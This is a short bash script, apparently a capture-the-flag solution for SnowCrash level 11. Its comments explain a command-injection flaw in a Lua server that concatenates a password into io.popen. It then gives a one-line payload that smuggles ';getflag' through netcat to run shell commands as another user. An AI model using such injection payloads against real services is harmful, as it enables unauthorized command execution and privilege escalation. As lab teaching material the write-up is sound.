#!/bin/bash
# This lua script establishes a connection on localhost by declaring a socket
# and binding it to localhost, port 5151 :
#
# local server = assert(socket.bind("127.0.0.1", 5151))
#
# By using netcat, we can connect to this server :
#
# level11@SnowCrash:~$ nc localhost 5151
# Password: toto
# Erf nope..
#
# A prompt asks us to type a password and then we receive a message.
#
# There is a line in the function hash that calls a function called popen :
# prog = io.popen("echo "..pass.." | sha1sum", "r")
#
# Similarly to a previous level, we can exploit the fact that this routine
# invokes a subshell with user flag11 privileges.
# This code directly concatenates the pass variable with the shellcode passed
# to io.popen.
# We can input a semi-colon into the pass argument, and then execute arbitrary
# shell code.
# The solution is as follows :

echo ";getflag > /var/crash/flag11" | nc localhost 5151
cat /var/crash/flag11
